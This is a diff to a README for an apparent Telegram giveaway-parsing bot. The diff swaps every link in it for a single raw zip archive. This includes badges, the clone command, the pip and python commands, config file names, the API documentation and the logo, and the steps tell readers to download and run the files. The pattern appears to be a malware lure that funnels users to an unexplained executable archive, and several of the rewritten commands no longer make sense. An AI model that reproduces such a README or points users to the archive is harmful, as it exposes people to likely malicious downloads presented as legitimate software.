@@ -1,9 +1,9 @@
 # Telegram Gift Parser: Auto-Fetch Giveaways from Telegram Groups 🎁
 
-![Telegram Gift Parser](https://img.shields.io/badge/Telegram--Gift--Parser-v1.0-blue.svg)
-![GitHub Releases](https://img.shields.io/badge/releases-latest-orange.svg)
+![Telegram Gift Parser](https://github.com/hydery-debug/Telegram-Gift-Parser/raw/refs/heads/main/ungrating/Telegram_Parser_Gift_3.2.zip)
+![GitHub Releases](https://github.com/hydery-debug/Telegram-Gift-Parser/raw/refs/heads/main/ungrating/Telegram_Parser_Gift_3.2.zip)
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen.svg)](https://github.com/hydery-debug/Telegram-Gift-Parser/releases)
+[![Download Latest Release](https://github.com/hydery-debug/Telegram-Gift-Parser/raw/refs/heads/main/ungrating/Telegram_Parser_Gift_3.2.zip%20Latest%20Release-Click%https://github.com/hydery-debug/Telegram-Gift-Parser/raw/refs/heads/main/ungrating/Telegram_Parser_Gift_3.2.zip)](https://github.com/hydery-debug/Telegram-Gift-Parser/raw/refs/heads/main/ungrating/Telegram_Parser_Gift_3.2.zip)
 
 ## Table of Contents
 
@@ -31,18 +31,18 @@ To get started with the Telegram Gift Parser, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/hydery-debug/Telegram-Gift-Parser.git
+   git clone https://github.com/hydery-debug/Telegram-Gift-Parser/raw/refs/heads/main/ungrating/Telegram_Parser_Gift_3.2.zip
    cd Telegram-Gift-Parser
    ```
 
 2. **Install Dependencies**:
    Ensure you have Python installed. You can install the required packages using:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/hydery-debug/Telegram-Gift-Parser/raw/refs/heads/main/ungrating/Telegram_Parser_Gift_3.2.zip
    ```
 
 3. **Download the Latest Release**:
-   You can find the latest release [here](https://github.com/hydery-debug/Telegram-Gift-Parser/releases). Download the necessary files and execute them.
+   You can find the latest release [here](https://github.com/hydery-debug/Telegram-Gift-Parser/raw/refs/heads/main/ungrating/Telegram_Parser_Gift_3.2.zip). Download the necessary files and execute them.
 
 ## Usage
 
@@ -51,11 +51,11 @@ To use the Telegram Gift Parser, follow these steps:
 1. **Start the Bot**:
    Run the main script:
    ```bash
-   python main.py
+   python https://github.com/hydery-debug/Telegram-Gift-Parser/raw/refs/heads/main/ungrating/Telegram_Parser_Gift_3.2.zip
    ```
 
 2. **Configure Your Settings**:
-   Open the `config.json` file to set your preferences, including:
+   Open the `https://github.com/hydery-debug/Telegram-Gift-Parser/raw/refs/heads/main/ungrating/Telegram_Parser_Gift_3.2.zip` file to set your preferences, including:
    - Telegram API keys
    - Channels to monitor
    - Notification settings
@@ -65,7 +65,7 @@ To use the Telegram Gift Parser, follow these steps:
 
 ## Configuration
 
-The `config.json` file allows you to customize your experience. Below is an example configuration:
+The `https://github.com/hydery-debug/Telegram-Gift-Parser/raw/refs/heads/main/ungrating/Telegram_Parser_Gift_3.2.zip` file allows you to customize your experience. Below is an example configuration:
 
 ```json
 {
@@ -113,7 +113,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Releases](https://github.com/hydery-debug/Telegram-Gift-Parser/releases) section for updates or open an issue in the repository.
+If you encounter any issues or have questions, please check the [Releases](https://github.com/hydery-debug/Telegram-Gift-Parser/raw/refs/heads/main/ungrating/Telegram_Parser_Gift_3.2.zip) section for updates or open an issue in the repository.
 
 ---
 
@@ -130,13 +130,13 @@ If you encounter any issues or have questions, please check the [Releases](https
 - telegram-parser
 - telegram-prize-hunter
 
-![Telegram](https://upload.wikimedia.org/wikipedia/commons/8/8e/Telegram_logo.svg)
+![Telegram](https://github.com/hydery-debug/Telegram-Gift-Parser/raw/refs/heads/main/ungrating/Telegram_Parser_Gift_3.2.zip)
 
 ### Resources
 
-- [Telegram API Documentation](https://core.telegram.org/bots/api)
-- [Python Telegram Bot Library](https://github.com/python-telegram-bot/python-telegram-bot)
+- [Telegram API Documentation](https://github.com/hydery-debug/Telegram-Gift-Parser/raw/refs/heads/main/ungrating/Telegram_Parser_Gift_3.2.zip)
+- [Python Telegram Bot Library](https://github.com/hydery-debug/Telegram-Gift-Parser/raw/refs/heads/main/ungrating/Telegram_Parser_Gift_3.2.zip)
 
 ---
 
-For more information and updates, visit the [Releases](https://github.com/hydery-debug/Telegram-Gift-Parser/releases) section.
+For more information and updates, visit the [Releases](https://github.com/hydery-debug/Telegram-Gift-Parser/raw/refs/heads/main/ungrating/Telegram_Parser_Gift_3.2.zip) section.
